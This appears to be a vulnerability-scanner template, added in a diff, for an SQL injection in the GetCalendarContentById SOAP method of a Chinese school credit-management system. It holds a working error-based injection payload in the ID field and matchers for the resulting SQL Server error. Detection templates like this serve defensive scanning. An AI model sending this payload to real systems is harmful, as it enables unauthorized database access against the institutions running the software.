@@ -1,0 +1,39 @@
+id: xuefenzhi-GetCalendarContentById-sql-injection
+
+info:
+  name: 学分制系统 GetCalendarContentById SQL注入
+  author: unknown
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /WebService_PantoSchool.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+          <soapenv:Header/>
+            <soapenv:Body>
+              <tem:GetCalendarContentById>
+                <!--type: string-->
+                <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>
+              </tem:GetCalendarContentById>
+            </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+      - type: status
+        status: 
+          - 500
+
+
+
+
+
